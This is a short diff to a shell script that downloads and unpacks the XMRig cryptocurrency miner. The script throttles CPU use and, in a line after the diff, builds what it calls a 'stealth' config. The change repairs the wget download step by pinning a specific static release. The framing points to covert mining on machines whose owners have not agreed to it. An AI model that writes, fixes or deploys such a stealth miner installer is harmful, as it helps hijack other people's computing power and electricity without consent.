@@ -11,9 +11,9 @@ MAX_THREADS=$((THREADS * CPU_USAGE / 100))
 
 # === Download and extract XMRig ===
 echo "[*] Downloading XMRig..."
-wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O xmrig.tar.gz
-tar -xf xmrig.tar.gz
-cd xmrig-*-linux-x64 || exit 1
+wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
+cd xmrig-6.24.0 || exit 1
 
 # === Create config.json ===
 echo "[*] Creating stealth config.json..."
